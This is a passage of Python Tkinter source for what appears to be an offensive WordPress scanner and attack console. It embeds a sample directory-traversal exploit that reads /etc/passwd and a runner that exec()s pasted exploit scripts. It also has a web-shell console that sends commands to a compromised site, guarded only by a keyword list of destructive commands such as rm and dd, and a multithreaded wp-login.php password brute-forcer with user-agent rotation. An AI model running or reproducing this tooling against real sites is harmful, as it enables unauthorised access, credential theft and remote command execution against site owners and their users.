            widget.config(state="disabled")
        self.shell_frame = shell_frame

    def create_custom_exploits_tab(self, parent):
        """Create tab for custom exploit scripts"""
        # Custom script editor
        script_frame = ttk.LabelFrame(parent, text=" Custom Exploit Script ", padding=5)
        script_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.custom_exploit_text = scrolledtext.ScrolledText(script_frame, wrap=tk.WORD, 
                                                           font=("Consolas", 10))
        self.custom_exploit_text.pack(fill=tk.BOTH, expand=True)
        
        # Add sample exploit when empty
        self.custom_exploit_text.insert(tk.END, "# Paste your exploit script here\n\n")
        self.custom_exploit_text.insert(tk.END, "# Example: WordPress Core 6.2 Directory Traversal\n")
        self.custom_exploit_text.insert(tk.END, "# CVE-2023-2745\n\n")
        self.custom_exploit_text.insert(tk.END, """import requests
        from colorama import init, Fore, Style
       
        init(autoreset=True)
       
        def exploit(target_url):
           payload = '../../../../../etc/passwd'
           response = requests.get(target_url, params={'wp_lang': payload})
           
           if response.status_code == 200:
               if "root:x:0:0:root" in response.text:
                   return {
                       "success": True,
                       "message": "Exploit successful! Accessed sensitive file",
                       "data": response.text
                   }
               else:
                   return {
                       "success": True,
                       "message": "Accessed content, but expected file not found",
                       "data": response.text
                   }
           return {
               "success": False,
               "message": f"Server responded with status: {response.status_code}"
           }
       
        # Main execution (will be called by the scanner)
        if __name__ == "__main__":
           target = input("Enter target URL (e.g., https://example.com/wp-login.php): ")
           result = exploit(target)
           print(f"Success: {result['success']}")
           print(f"Message: {result['message']}")
           if result['success']:
               print("Data:")
               print(result['data'])
        """)
        
        # Script controls
        ctrl_frame = ttk.Frame(parent)
        ctrl_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(ctrl_frame, text="Load Script", 
                  command=self.load_exploit_script).pack(side=tk.LEFT, padx=5)
        ttk.Button(ctrl_frame, text="Save Script", 
                  command=self.save_custom_script).pack(side=tk.LEFT, padx=5)
        ttk.Button(ctrl_frame, text="Clear Editor", 
                  command=self.clear_custom_editor).pack(side=tk.LEFT, padx=5)
        ttk.Button(ctrl_frame, text="Run Script", 
                  style="Accent.TButton", 
                  command=self.run_custom_script).pack(side=tk.RIGHT, padx=5)

    def save_custom_script(self):
        """Save content from custom exploit editor to file"""
        file_path = filedialog.asksaveasfilename(
            defaultextension=".py",
            filetypes=[("Python files", "*.py")]
        )
        if not file_path:
            return
            
        try:
            exploit_code = self.custom_exploit_text.get("1.0", tk.END)
            with open(file_path, 'w') as f:
                f.write(exploit_code)
            messagebox.showinfo("Success", f"Exploit script saved to:\n{file_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save exploit script: {str(e)}")

    def clear_custom_editor(self):
        """Clear custom exploit editor"""
        self.custom_exploit_text.delete("1.0", tk.END)

    def run_custom_script(self):
        """Execute the custom exploit script"""
        exploit_code = self.custom_exploit_text.get("1.0", tk.END)
        if not exploit_code.strip():
            messagebox.showwarning("Error", "No exploit script to execute")
            return
            
        target_url = self.exploit_url_entry.get().strip()
        if not target_url:
            messagebox.showwarning("Error", "Enter a target URL")
            return
            
        # Prepare to capture output
        output_capture = StringIO()
        old_stdout = sys.stdout
        sys.stdout = output_capture
        
        try:
            # Create a context for the exploit
            context = {
                'requests': requests,
                'target_url': target_url,
                'input': self.simulated_input
            }
            
            # Execute the exploit code
            exec(exploit_code, context)
            
            # Get the output
            output = output_capture.getvalue()
            
            # Display results
            self.log_exploit_message(f"[*] Custom exploit executed against: {target_url}", "cyan")
            self.log_exploit_message(output)
            
            # Check if we have a result dictionary
            if 'result' in context:
                result = context['result']
                if result.get('success'):
                    self.log_exploit_message("[+] Exploit successful!", "green")
                    self.log_exploit_message(f"Message: {result.get('message')}")
                    if result.get('data'):
                        self.log_exploit_message("Data:")
                        self.log_exploit_message(result['data'])
                else:
                    self.log_exploit_message("[-] Exploit failed", "red")
                    self.log_exploit_message(f"Error: {result.get('message')}")
            
        except Exception as e:
            self.log_exploit_message(f"[!] Error executing custom exploit: {str(e)}", "red")
            traceback.print_exc(file=output_capture)
            self.log_exploit_message(output_capture.getvalue())
        finally:
            sys.stdout = old_stdout

    def simulated_input(self, prompt):
        """Simulate input() function for exploit scripts"""
        # Use target URL if prompt mentions URL
        if 'url' in prompt.lower() or 'target' in prompt.lower():
            return self.exploit_url_entry.get().strip()
            
        # Create dialog to get user input
        return simpledialog.askstring("Exploit Input", prompt)

    def show_exploit_history(self):
        history_window = tk.Toplevel(self)
        history_window.title("Exploit History")
        history_window.geometry("800x500")
        frame = ttk.Frame(history_window, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)
        columns = ("timestamp", "target", "cve", "success", "message")
        tree = ttk.Treeview(frame, columns=columns, show="headings", height=15)
        tree.heading("timestamp", text="Timestamp")
        tree.heading("target", text="Target")
        tree.heading("cve", text="CVE ID")
        tree.heading("success", text="Success")
        tree.heading("message", text="Message")
        tree.column("timestamp", width=150)
        tree.column("target", width=200)
        tree.column("cve", width=100)
        tree.column("success", width=80)
        tree.column("message", width=300)
        v_scroll = ttk.Scrollbar(frame, orient="vertical", command=tree.yview)
        h_scroll = ttk.Scrollbar(frame, orient="horizontal", command=tree.xview)
        tree.configure(yscrollcommand=v_scroll.set, xscrollcommand=h_scroll.set)
        tree.grid(row=0, column=0, sticky="nsew")
        v_scroll.grid(row=0, column=1, sticky="ns")
        h_scroll.grid(row=1, column=0, sticky="ew")
        frame.grid_rowconfigure(0, weight=1)
        frame.grid_columnconfigure(0, weight=1)
        for exploit in self.scanner.exploit_history:
            success_text = "Yes" if exploit.get("success") else "No"
            tree.insert("", tk.END, values=(
                exploit.get("timestamp"),
                exploit.get("target"),
                exploit.get("cve"),
                success_text,
                exploit.get("message", "")[:100] + "..." if len(exploit.get("message", "")) > 100 else exploit.get("message", "")
            ), tags=("success" if exploit.get("success") else "fail"))
        tree.tag_configure("success", background="#002d0f")
        tree.tag_configure("fail", background="#2d0000")

    def add_context_menu(self, widget):
        context_menu = tk.Menu(widget, tearoff=0)
        context_menu.add_command(label="Copy", command=lambda: self.copy_text(widget))
        context_menu.add_command(label="Paste", command=lambda: self.paste_text(widget))
        context_menu.add_command(label="Copy All", command=lambda: self.copy_all(widget))
        if isinstance(widget, tk.Text) or isinstance(widget, scrolledtext.ScrolledText):
            context_menu.add_command(label="Select All", command=lambda: widget.tag_add(tk.SEL, "1.0", tk.END))
        widget.bind("<Button-3>", lambda event: context_menu.tk_popup(event.x_root, event.y_root))
    
    def copy_text(self, widget):
        if isinstance(widget, tk.Text) or isinstance(widget, scrolledtext.ScrolledText):
            try:
                text = widget.selection_get()
                self.clipboard_clear()
                self.clipboard_append(text)
            except:
                pass
        elif isinstance(widget, ttk.Treeview):
            try:
                item = widget.selection()[0]
                values = widget.item(item, 'values')
                text = "\t".join(map(str, values))
                self.clipboard_clear()
                self.clipboard_append(text)
            except:
                pass
        elif isinstance(widget, tk.Entry) or isinstance(widget, ttk.Entry):
            widget.event_generate("<<Copy>>")
    
    def copy_all(self, widget):
        if isinstance(widget, tk.Text) or isinstance(widget, scrolledtext.ScrolledText):
            self.clipboard_clear()
            self.clipboard_append(widget.get("1.0", tk.END))
        elif isinstance(widget, ttk.Treeview):
            all_text = ""
            for item in widget.get_children():
                values = widget.item(item, 'values')
                all_text += "\t".join(map(str, values)) + "\n"
            self.clipboard_clear()
            self.clipboard_append(all_text)
    
    def paste_text(self, widget):
        if isinstance(widget, tk.Text) or isinstance(widget, scrolledtext.ScrolledText):
            try:
                text = self.clipboard_get()
                widget.insert(tk.INSERT, text)
            except:
                pass
        elif isinstance(widget, tk.Entry) or isinstance(widget, ttk.Entry):
            widget.event_generate("<<Paste>>")
    
    def show_brute_force_window(self):
        if not hasattr(self, 'brute_window') or not self.brute_window.winfo_exists():
            self.create_brute_force_window()
        self.brute_window.lift()
        self.brute_window.deiconify()
    
    def create_brute_force_window(self):
        self.brute_window = tk.Toplevel(self)
        self.brute_window.title("Brute Force Attack")
        self.brute_window.geometry("800x700")
        self.brute_window.protocol("WM_DELETE_WINDOW", self.brute_window.withdraw)
        main_frame = ttk.Frame(self.brute_window, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)
        main_frame.grid_columnconfigure(0, weight=1)
        main_frame.grid_rowconfigure(1, weight=1)
        
        # Input section
        input_frame = ttk.LabelFrame(main_frame, text=" Attack Parameters ", padding=10)
        input_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        input_frame.grid_columnconfigure(1, weight=1)
        ttk.Label(input_frame, text="Target URL:", 
                 font=("Segoe UI", 10, "bold")).grid(row=0, column=0, sticky="w", pady=5)
        self.brute_url_entry = ttk.Entry(input_frame)
        self.brute_url_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
        self.brute_url_entry.insert(0, "https://example.com/wp-login.php")
        ttk.Label(input_frame, text="Username:", 
                 font=("Segoe UI", 10, "bold")).grid(row=1, column=0, sticky="w", pady=5)
        username_frame = ttk.Frame(input_frame)
        username_frame.grid(row=1, column=1, sticky="ew", padx=5, pady=5)
        username_frame.grid_columnconfigure(0, weight=1)
        self.brute_username_entry = ttk.Combobox(username_frame)
        self.brute_username_entry.grid(row=0, column=0, sticky="ew")
        grab_btn = ttk.Button(username_frame, text="Grab", width=8,
                             command=self.grab_usernames)
        grab_btn.grid(row=0, column=1, padx=(5, 0))
        ttk.Label(input_frame, text="Password List:", 
                 font=("Segoe UI", 10, "bold")).grid(row=2, column=0, sticky="w", pady=5)
        password_frame = ttk.Frame(input_frame)
        password_frame.grid(row=2, column=1, sticky="ew", padx=5, pady=5)
        password_frame.grid_columnconfigure(0, weight=1)
        self.brute_password_entry = ttk.Entry(password_frame)
        self.brute_password_entry.grid(row=0, column=0, sticky="ew")
        self.browse_btn = ttk.Button(password_frame, text="Browse", width=8,
                                    command=self.browse_passwords)
        self.browse_btn.grid(row=0, column=1, padx=(5, 0))
        ttk.Label(input_frame, text="Threads:", 
                 font=("Segoe UI", 10, "bold")).grid(row=3, column=0, sticky="w", pady=5)
        self.brute_threads_spin = ttk.Spinbox(input_frame, from_=1, to=50, width=5)
        self.brute_threads_spin.grid(row=3, column=1, sticky="w", padx=5, pady=5)
        self.brute_threads_spin.set("10")
        ttk.Label(input_frame, text="Delay (ms):", 
                 font=("Segoe UI", 10, "bold")).grid(row=4, column=0, sticky="w", pady=5)
        self.brute_delay_spin = ttk.Spinbox(input_frame, from_=0, to=5000, increment=100, width=5)
        self.brute_delay_spin.grid(row=4, column=1, sticky="w", padx=5, pady=5)
        self.brute_delay_spin.set("200")
        
        # Results section
        results_frame = ttk.LabelFrame(main_frame, text=" Attack Results ", padding=10)
        results_frame.grid(row=1, column=0, sticky="nsew", pady=(0, 10))
        results_frame.grid_columnconfigure(0, weight=1)
        results_frame.grid_rowconfigure(0, weight=1)
        self.brute_results_area = scrolledtext.ScrolledText(results_frame, font=("Consolas", 9))
        self.brute_results_area.grid(row=0, column=0, sticky="nsew")
        self.brute_results_area.config(state="disabled")
        
        # Controls
        control_frame = ttk.Frame(main_frame)
        control_frame.grid(row=2, column=0, sticky="e", pady=(0, 5))
        self.brute_clear_btn = ttk.Button(control_frame, text="Clear Results", 
                                        command=self.clear_brute_results)
        self.brute_clear_btn.pack(side=tk.RIGHT, padx=5)
        self.brute_stop_btn = ttk.Button(control_frame, text="Stop", 
                                       command=self.stop_brute_attack, state="disabled")
        self.brute_stop_btn.pack(side=tk.RIGHT, padx=5)
        self.brute_start_btn = ttk.Button(control_frame, text="Start Attack", 
                                         command=self.start_brute_attack)
        self.brute_start_btn.pack(side=tk.RIGHT, padx=5)

    def grab_targets(self):
        targets = list(self.scan_results.keys())
        if not targets:
            messagebox.showinfo("No Targets", "Scan some websites first")
            return
        self.exploit_url_entry['values'] = targets
        self.exploit_url_entry.set('')
        all_vulns = set()
        for result in self.scan_results.values():
            for vuln in result.get("vulnerabilities", []):
                all_vulns.add(vuln["cve"])
        self.vuln_combo['values'] = list(all_vulns)
        self.vuln_combo.set('')
    
    def log_exploit_message(self, message, color=None):
        self.exploit_results_area.config(state="normal")
        if color:
            tag_name = f"color_{color}"
            self.exploit_results_area.tag_configure(tag_name, foreground=color)
            self.exploit_results_area.insert(tk.END, message + "\n", tag_name)
        else:
            self.exploit_results_area.insert(tk.END, message + "\n")
        self.exploit_results_area.yview(tk.END)
        self.exploit_results_area.config(state="disabled")
    
    def clear_exploit_results(self):
        self.exploit_results_area.config(state="normal")
        self.exploit_results_area.delete(1.0, tk.END)
        self.exploit_results_area.config(state="disabled")
    
    def start_exploit(self):
        if self.active_exploit:
            return
        target = self.exploit_url_entry.get().strip()
        cve_id = self.vuln_combo.get().strip()
        if not target:
            messagebox.showerror("Error", "Select a target URL")
            return
        if not cve_id:
            messagebox.showerror("Error", "Select a vulnerability")
            return
        self.active_exploit = True
        self.exploit_start_btn.config(state="disabled")
        self.exploit_stop_btn.config(state="normal")
        self.clear_exploit_results()
        self.log_exploit_message(f"[*] Starting exploit for {cve_id} on {target}", "cyan")
        self.log_exploit_message(f"[*] Loading exploit module...", "cyan")
        exploit_thread = threading.Thread(
            target=self.run_exploit,
            args=(target, cve_id),
            daemon=True
        )
        exploit_thread.start()
    
    def stop_exploit(self):
        self.active_exploit = False
        self.log_exploit_message("[!] Exploit stopped by user", "red")
        
    def run_exploit(self, target, cve_id):
        try:
            result = self.scanner.exploit_vulnerability(target, cve_id)
            if result.get("success"):
                self.log_exploit_message(f"[+] EXPLOIT SUCCESSFUL!", "green")
                self.log_exploit_message(f"[*] Result: {result.get('message')}", "green")
                if result.get("shell_url"):
                    self.log_exploit_message(f"[*] Webshell URL: {result['shell_url']}", "green")
                    self.after(0, self.enable_shell_section, result['shell_url'])
                if result.get("data"):
                    self.log_exploit_message("\n[+] Extracted Data:\n")
                    self.log_exploit_message(result["data"])
            else:
                self.log_exploit_message(f"[-] Exploit failed: {result.get('message')}", "red")
        except Exception as e:
            self.log_exploit_message(f"[!] Exploit error: {str(e)}", "red")
        finally:
            self.active_exploit = False
            self.after(0, lambda: self.exploit_start_btn.config(state="normal"))
            self.after(0, lambda: self.exploit_stop_btn.config(state="disabled"))
    
    def enable_shell_section(self, shell_url):
        self.shell_url_entry.delete(0, tk.END)
        self.shell_url_entry.insert(0, shell_url)
        for widget in self.shell_frame.winfo_children():
            widget.config(state="normal")
    
    def execute_shell_command(self):
        shell_url = self.shell_url_entry.get().strip()
        command = self.shell_cmd_entry.get().strip()
        if not shell_url or not command:
            return
        try:
            destructive_cmds = ["rm", "format", "del", "shutdown", "reboot", "kill", "mv", "dd"]
            if any(cmd in command for cmd in destructive_cmds):
                if not messagebox.askyesno("Warning", "This command appears destructive. Execute anyway?"):
                    return
            params = {'cmd': command}
            response = requests.get(shell_url, params=params, timeout=10)
            if response.status_code == 200:
                self.log_exploit_message(f"\n[+] Command: {command}", "yellow")
                self.log_exploit_message(f"[+] Output:\n{response.text}")
            else:
                self.log_exploit_message(f"[-] Command execution failed (Status: {response.status_code})", "red")
        except Exception as e:
            self.log_exploit_message(f"[!] Error executing command: {str(e)}", "red")
    
    def grab_usernames(self):
        selection = self.results_tree.selection()
        if not selection:
            messagebox.showwarning("Selection Error", "Please select a website first")
            return
        item = selection[0]
        url = self.results_tree.item(item, "values")[0]
        result = self.scan_results.get(url)
        if not result:
            messagebox.showwarning("No Data", "No scan data available for this site")
            return
        users = result.get("users", [])
        if not users:
            messagebox.showinfo("No Users", "No usernames found for this site")
            return
        self.brute_username_entry['values'] = users
        self.brute_username_entry.set('')
        login_page = result.get("login_page", "")
        if login_page != "Not found":
            self.brute_url_entry.delete(0, tk.END)
            self.brute_url_entry.insert(0, login_page)
    
    def browse_passwords(self):
        filepath = filedialog.askopenfilename(title="Select Password File", 
                                             filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filepath:
            self.brute_password_entry.delete(0, tk.END)
            self.brute_password_entry.insert(0, filepath)
    
    def log_brute_message(self, message, color=None):
        self.brute_results_area.config(state="normal")
        if color:
            tag_name = f"color_{color}"
            self.brute_results_area.tag_configure(tag_name, foreground=color)
            self.brute_results_area.insert(tk.END, message + "\n", tag_name)
        else:
            self.brute_results_area.insert(tk.END, message + "\n")
        self.brute_results_area.yview(tk.END)
        self.brute_results_area.config(state="disabled")
    
    def clear_brute_results(self):
        self.brute_results_area.config(state="normal")
        self.brute_results_area.delete(1.0, tk.END)
        self.brute_results_area.config(state="disabled")
    
    def start_brute_attack(self):
        if self.is_attacking:
            return
        url = self.brute_url_entry.get().strip()
        username = self.brute_username_entry.get().strip()
        password_file = self.brute_password_entry.get().strip()
        threads = self.brute_threads_spin.get()
        delay = self.brute_delay_spin.get()
        if not url.startswith("http"):
            messagebox.showerror("Error", "Invalid URL format")
            return
        if not username:
            messagebox.showerror("Error", "Username is required")
            return
        if not password_file:
            messagebox.showerror("Error", "Password file is required")
            return
        try:
            with open(password_file, "r") as f:
                passwords = [line.strip() for line in f.readlines()]
        except Exception as e:
            messagebox.showerror("Error", f"Failed to read password file: {str(e)}")
            return
        try:
            threads = int(threads)
            delay = float(delay) / 1000
        except ValueError:
            messagebox.showerror("Error", "Invalid threads or delay value")
            return
        self.is_attacking = True
        self.stop_flag = False
        self.successful_credentials = []
        self.brute_start_btn.config(state="disabled")
        self.brute_stop_btn.config(state="normal")
        self.clear_brute_results()
        attack_thread = threading.Thread(
            target=self.run_brute_attack,
            args=(url, username, passwords, threads, delay),
            daemon=True
        )
        attack_thread.start()
    
    def stop_brute_attack(self):
        self.stop_flag = True
        self.log_brute_message("[!] Attack stopped by user", "red")
        
    def run_brute_attack(self, url, username, passwords, threads, delay):
        self.log_brute_message(f"[*] Starting attack on: {url}", "cyan")
        self.log_brute_message(f"[*] Target username: {username}", "cyan")
        self.log_brute_message(f"[*] Loaded {len(passwords)} passwords", "cyan")
        self.log_brute_message(f"[*] Using {threads} threads with {delay*1000:.0f}ms delay", "cyan")
        self.log_brute_message("-" * 50, "cyan")
        password_queue = Queue()
        for password in passwords:
            password_queue.put(password)
        def worker():
            session = requests.Session()
            while not password_queue.empty() and not self.stop_flag:
                password = password_queue.get()
                try:
                    login_data = {
                        'log': username,
                        'pwd': password,
                        'wp-submit': 'Log In',
                        'redirect_to': f'{url.rsplit("/", 1)[0]}/wp-admin/',
                        'testcookie': '1'
                    }
                    headers = {
                        'User-Agent': random.choice(self.scanner.user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Connection': 'keep-alive'
                    }
                    time.sleep(delay)
                    response = session.post(
                        url,
                        data=login_data,
                        headers=headers,
                        allow_redirects=True,
                        timeout=15
                    )
                    if response.url.endswith('/wp-admin/') or 'wp-admin' in response.url:
                        if 'wp-admin-bar' in response.text and 'Dashboard' in response.text:
                            self.successful_credentials.append((username, password))
                            self.log_brute_message(f"\n[+] SUCCESS! {username}:{password}", "green")
                            self.stop_flag = True
                        else:
                            self.log_brute_message(f"[-] Failed: {password} (Possible false positive)", "yellow")
                    else:
                        self.log_brute_message(f"[-] Failed: {password}", "yellow")
                except RequestException as e:
                    self.log_brute_message(f"[!] Error: {str(e)}", "red")
                except Exception as e:
                    self.log_brute_message(f"[!] Critical error: {str(e)}", "red")
                finally:
                    password_queue.task_done()
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
        password_queue.join()
        self.is_attacking = False
        self.after(0, lambda: self.brute_start_btn.config(state="normal"))
        self.after(0, lambda: self.brute_stop_btn.config(state="disabled"))
        if self.successful_credentials:
            self.log_brute_message(f"\n[!] Attack completed successfully - Credentials found!", "green")
            for cred in self.successful_credentials:
                self.log_brute_message(f"[+] Valid credentials: {cred[0]}:{cred[1]}", "green")
        else:
            self.log_brute_message("\n[!] Attack completed - No valid credentials found", "cyan")

    def open_docs(self):
        webbrowser.open("https://wordpress.org/documentation/")
        
    def open_settings(self):
        settings_window = tk.Toplevel(self)
        settings_window.title("Settings")
        settings_window.geometry("400x300")
        frame = ttk.Frame(settings_window, padding=20)
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Add Auto-Save setting
        auto_save_frame = ttk.Frame(frame)
        auto_save_frame.grid(row=4, column=0, sticky="w", pady=5)
        auto_save_cb = ttk.Checkbutton(auto_save_frame, text="Enable Auto-Save of Exploits", 
                                         variable=self.auto_save_var)
        auto_save_cb.grid(row=0, column=0, sticky="w")
        ttk.Label(auto_save_frame, text="(Automatically saves loaded exploits to scanner)", 
        font=("Segoe UI", 9), foreground="#a0aec0").grid(row=1, column=0, sticky="w")        
        
        # Auto-exploit setting
        auto_exploit_var = tk.BooleanVar(value=self.scanner.auto_exploit)
        auto_exploit_cb = ttk.Checkbutton(frame, text="Enable Auto-Exploit", 
                                         variable=auto_exploit_var)
        auto_exploit_cb.grid(row=0, column=0, sticky="w", pady=5)
        
        # Exploit alerts setting
        exploit_alert_var = tk.BooleanVar(value=self.scanner.exploit_alert)
        exploit_alert_cb = ttk.Checkbutton(frame, text="Enable Exploit Alerts", 
                                          variable=exploit_alert_var)
        exploit_alert_cb.grid(row=1, column=0, sticky="w", pady=5)
        
        # Alert sounds setting
        alert_sound_var = tk.BooleanVar(value=self.alert_sound_enabled)
        alert_sound_cb = ttk.Checkbutton(frame, text="Enable Alert Sounds", 
                                        variable=alert_sound_var)
        alert_sound_cb.grid(row=2, column=0, sticky="w", pady=5)
        
        # Save button
        save_btn = ttk.Button(frame, text="Save Settings", style="Accent.TButton",
                             command=lambda: self.save_settings(
                                 auto_exploit_var.get(),
                                 exploit_alert_var.get(),
                                 alert_sound_var.get()
                             ))
        save_btn.grid(row=3, column=0, pady=20)
    
    def save_settings(self, auto_exploit, exploit_alert, alert_sound):
        self.scanner.auto_exploit = auto_exploit
        self.scanner.exploit_alert = exploit_alert
        self.alert_sound_enabled = alert_sound
        messagebox.showinfo("Settings", "Settings saved successfully!")
    
    def load_custom_vulns(self):
        file_path = filedialog.askopenfilename(
            filetypes=[("JSON files", "*.json")]
        )
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    self.scanner.plugin_vulns = json.load(f)
                messagebox.showinfo("Success", "Vulnerabilities loaded successfully!")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load vulnerabilities:\n{str(e)}")
    
    def save_results(self):
        file_path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("HTML files", "*.html"), ("All files", "*.*")]
        )
        if not file_path:
            return
        try:
            with open(file_path, 'w') as f:
                json.dump(self.scan_results, f, indent=2)
            messagebox.showinfo("Success", f"Results saved to:\n{file_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save results:\n{str(e)}")
    
    def clear_results(self):
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
        self.scan_results = {}
        self.status_var.set("Results cleared")
        self.progress_var.set(0)
        
    def start_scan(self):
        if self.scan_active:
            messagebox.showwarning("Scan Running", "A scan is already in progress")
            return
        targets = [t.strip() for t in self.targets_text.get("1.0", tk.END).splitlines() if t.strip()]
        if not targets:
            messagebox.showwarning("Input Error", "Please enter at least one target URL")
            return
        for url in targets:
            if url in self.scan_results:
                for item in self.results_tree.get_children():
                    if self.results_tree.item(item, "values")[0] == url:
                        self.results_tree.delete(item)
                del self.scan_results[url]
        self.scan_active = True
        self.status_var.set(f"Scanning {len(targets)} websites...")
        self.scan_thread = threading.Thread(target=self.run_scans, args=(targets,), daemon=True)
        self.scan_thread.start()
    
    def stop_scan(self):
        if self.scan_active:
            self.scan_active = False
            self.status_var.set("Scan stopped by user")
    
    def run_scans(self, targets):
        total = len(targets)
        for i, target in enumerate(targets):
            if not self.scan_active:
                break
            progress = int((i / total) * 100)
            self.progress_var.set(progress)
            self.scan_counter.config(text=f"Scans: {i+1}/{total}")
            self.status_var.set(f"Scanning: {target} ({i+1}/{total})")
            result = self.scanner.scan_site(target)
            self.scan_results[target] = result
            self.add_to_results_tree(result)
            if result.get("vulnerabilities"):
                critical_vulns = [v for v in result["vulnerabilities"] 
                                 if v.get("severity") == "critical" or 
                                    (v.get("cvss") and float(v.get("cvss")) >= 9.0)]
                if critical_vulns:
                    self.after(0, self.show_critical_alert, target, critical_vulns)
        self.progress_var.set(100)
        self.scan_counter.config(text=f"Scans: {total}/{total}")
        self.status_var.set(f"Scan completed for {min(len(targets), i+1)} websites")
        self.scan_active = False
    
    def show_critical_alert(self, target, vulnerabilities):
        if self.alert_sound_enabled:
            try:
                winsound.MessageBeep(winsound.MB_ICONHAND)
            except:
                pass
        alert_text = f"CRITICAL VULNERABILITY DETECTED!\n\nTarget: {target}\n\n"
        for i, vuln in enumerate(vulnerabilities[:3]):
            alert_text += f"{i+1}. {vuln.get('cve')} - {vuln.get('type')}\n"
            alert_text += f"   Severity: {vuln.get('severity')}, CVSS: {vuln.get('cvss')}\n"
            alert_text += f"   Description: {vuln.get('description')[:100]}...\n\n"
        if len(vulnerabilities) > 3:
            alert_text += f"+ {len(vulnerabilities)-3} more vulnerabilities..."
        alert_window = tk.Toplevel(self)
        alert_window.title("CRITICAL VULNERABILITY ALERT")
        alert_window.geometry("700x400")
        alert_window.attributes('-topmost', True)
        alert_window.configure(bg="#ff0000")
        frame = ttk.Frame(alert_window, padding=20)
        frame.pack(fill=tk.BOTH, expand=True)
        warning_icon = ttk.Label(frame, text="⚠️", font=("Segoe UI", 48), foreground="yellow")
        warning_icon.pack(pady=10)
        msg_label = ttk.Label(frame, text="CRITICAL VULNERABILITY DETECTED!", 
                            font=("Segoe UI", 14, "bold"), foreground="white")
        msg_label.pack(pady=5)
        details_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, height=10, 
                                               font=("Segoe UI", 10))
        details_text.pack(fill=tk.BOTH, expand=True, pady=10)
        details_text.insert(tk.END, alert_text)
        details_text.config(state=tk.DISABLED)
        
        # Add exploit button
        exploit_frame = ttk.Frame(frame)
        exploit_frame.pack(fill=tk.X, pady=(10, 0))
        if vulnerabilities:
            exploit_btn = ttk.Button(exploit_frame, text="Prepare Exploit", 
                                    style="Critical.TButton",
                                    command=lambda: self.prepare_exploit(target, vulnerabilities[0]['cve'], alert_window))
            exploit_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(exploit_frame, text="Dismiss", 
                  command=alert_window.destroy).pack(side=tk.RIGHT, padx=5)
        alert_window.after(20000, alert_window.destroy)
    
    def prepare_exploit(self, target, cve_id, alert_window):
        """Prepare exploit console for the vulnerability"""
        self.show_exploit_console()
        self.exploit_url_entry.delete(0, tk.END)
        self.exploit_url_entry.insert(0, target)
        self.vuln_combo.delete(0, tk.END)
        self.vuln_combo.insert(0, cve_id)
        alert_window.destroy()

    def add_to_results_tree(self, result):
        plugins_count = len(result["plugins"])
        themes_count = len(result["themes"])
        vulns_count = len(result["vulnerabilities"])
        login_text = "Found" if result["login_page"] != "Not found" else "Not found"
        values = (
            result["url"],
            result["ip"],
            result["wp_version"],
            plugins_count,
            themes_count,
            vulns_count,
            login_text,
            result["status"],
            f"{result['scan_time']:.2f}s"
        )
        tags = []
        if vulns_count > 0:
            tags.append("vulnerable")
        elif "error" in result["status"].lower():
            tags.append("error")
        else:
            tags.append("secure")
        self.results_tree.insert("", tk.END, values=values, tags=tags)
        self.results_tree.tag_configure("vulnerable", background="#2d0000")
        self.results_tree.tag_configure("error", background="#2d1a00")
        self.results_tree.tag_configure("secure", background="#002d0f")
    
    def show_details(self, event):
        selection = self.results_tree.selection()
        if not selection:
            return
        item = selection[0]
        url = self.results_tree.item(item, "values")[0]
        result = self.scan_results.get(url)
        if not result:
            return
        self.update_summary_tab(result)
        self.update_plugins_tab(result)
        self.update_themes_tab(result)
        self.update_vulns_tab(result)
        self.update_users_tab(result)
        self.update_tech_tab(result)
        self.update_config_tab(result)
    
    def update_summary_tab(self, result):
        for widget in self.summary_tab.winfo_children():
            widget.destroy()
        canvas = tk.Canvas(self.summary_tab, highlightthickness=0)
        scrollbar = ttk.Scrollbar(self.summary_tab, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        scrollable_frame.bind("<Configure>",lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        ttk.Label(scrollable_frame, text="Scan Summary", 
                 font=("Segoe UI", 14, "bold")).pack(anchor=tk.W, pady=(0, 15))
        ttk.Label(scrollable_frame, text="Website URL:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        ttk.Label(scrollable_frame, text=result["url"], 
                 font=("Segoe UI", 10)).pack(anchor=tk.W, pady=2, padx=10)
        ttk.Label(scrollable_frame, text="IP Address:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        ttk.Label(scrollable_frame, text=result["ip"], 
                 font=("Segoe UI", 10)).pack(anchor=tk.W, pady=2, padx=10)
        ttk.Label(scrollable_frame, text="WordPress Version:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        ttk.Label(scrollable_frame, text=result["wp_version"], 
                 font=("Segoe UI", 10)).pack(anchor=tk.W, pady=2, padx=10)
        ttk.Label(scrollable_frame, text="Plugins Detected:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        ttk.Label(scrollable_frame, text=str(len(result["plugins"])), 
                 font=("Segoe UI", 10)).pack(anchor=tk.W, pady=2, padx=10)
        ttk.Label(scrollable_frame, text="Themes Detected:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        ttk.Label(scrollable_frame, text=str(len(result["themes"])), 
